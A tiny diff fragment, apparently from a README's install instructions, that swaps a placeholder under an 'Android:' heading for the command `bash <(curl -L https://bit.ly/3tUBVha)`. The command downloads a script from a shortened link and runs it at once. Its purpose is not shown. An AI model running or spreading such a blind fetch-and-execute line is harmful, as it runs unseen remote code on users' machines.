@@ -20,7 +20,7 @@
 
 **Android:** 
 
-`qqqqqqqq`
+`bash <(curl -L https://bit.ly/3tUBVha)`
 
 **iOS:**  
 
